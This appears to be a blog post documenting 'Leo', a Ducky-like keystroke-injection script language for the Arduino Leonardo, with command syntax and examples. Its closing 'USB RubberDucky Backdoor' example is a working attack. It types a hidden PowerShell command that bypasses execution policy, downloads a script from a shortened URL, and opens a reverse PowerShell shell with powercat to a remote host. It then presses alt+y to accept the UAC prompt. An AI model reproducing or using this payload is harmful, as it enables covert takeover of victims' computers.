Arduino Leonardo is one of Arduino family, which can emulate keyboard and mouse, some of my friends asked me to write an interpreter for the Arduino which can turn a ducky like script into C code. This post is going to be how to use that Leo interpreter

### How to Run It?

Its pretty simple just clone the repo and copy the leo.py to desire location, then

python leo.py payload.txt -o payload.c
This will convert the Leo script into C code

### What is Ducky Script

Ducky Script is the language of the USB Rubber Ducky. Writing scripts for can be done from any common ascii text editor such as Notepad, vi, emacs, nano, gedit, kedit, TextEdit, etc.

### What is Leo Script

Leo is a ducky like script, it very simple and easy to understand. I said ducky like script because actually, you can not use a ducky script with Leo, some syntax might look similar to ducky script but its not

### Syntax

Leo script is simple. Each command resides on a new line and may have options follow. Commands are written in ALL CAPS, Below is a list of commands and their function, followed by some example usage.

### Comment

lines beginning with `#` symbol will not be processed. `#` is a comment.

```python
# The next three lines execute a command prompt in Windows
gui "r"
echo "cmd"
enter
```

### Sleep

`sleep` creates a momentary pause in the Leo script. It is quite handy for creating a moment of pause between sequential commands that may take the target computer sometime to process. `sleep` time is specified in milliseconds from 1 to 10000. Multiple `sleep` commands can be used to create longer delays.

```python
sleep 500
# will wait 500ms before continuing to the next command.
```

### Echo

`echo` processes the text following taking special care to auto-shift. `echo` can accept a single or multiple characters.

```python
gui "r"
sleep 500
echo "notepad.exe"
enter
sleep 1000
echo "Hello World!"
```

### GUI

Emulates the Windows-Key, sometimes referred to as the Super-key.

```
gui "r"
# will hold the Windows-key and press r, on windows systems resulting in the Run menu.
```

### SHIFT

Unlike CAPSLOCK, cruise control for cool, the SHIFT command can be used when navigating fields to select text, among other functions.

```
shift tab
# this is paste for most operating systems
```

<!-- Check out `python leo.py keylist` to see all available argument keys -->

### ALT 

Found to the left of the space key on most keyboards, the ALT key is instrumental in many automation operations. ALT is envious of CONTROL

```python
gui "r"
sleep 50
echo "notepad.exe"
enter
sleep 100
echp "Hello World"
alt "f"
echo "s"
```

### CTRL 

The king of key-combos, CONTROL is all mighty.

```python
ctrl esc
# this is equivalent to the GUI key in Windows
```

### Arrow Keys

- up_arrow
- down_arrow
- left_arrow
- right_arrow

### Press multiple keys together

combine keys allow you to perform multiple keypresses

```python
gui "r"
echo "powershell"
ctrl shift enter
alt "y"
```


### Examples

```python
################################
##  USB RubberDucky Backdoor  ##
################################

# This first delay stalls the Ducky for 5.5 seconds to give the target
# operating system some time to mount the USB as a keyboard device.
sleep 5500

# Opens the Windows Run prompt.
gui "r"

# Delays .7 seconds to give the Run prompt time to open.
sleep 700

# Types the PowerShell payload.
echo "powershell /w Hidden /C $a=$env:TEMP;Set-ExecutionPolicy Bypass;wget https://cutt.ly/cW13i -o $a\d.ps1;ipmo $a\d.ps1;powercat -c 192.168.1.10 -p 3000 -e powershell"

# Presses Ctrl + Shirt + Enter to execute the PowerShell with administrative privileges.
ctrl shift enter

# Delay .85 seconds to give the UAC prompt time to open.
sleep 850

# ALT + Y to bypass UAC.
alt "y"
```
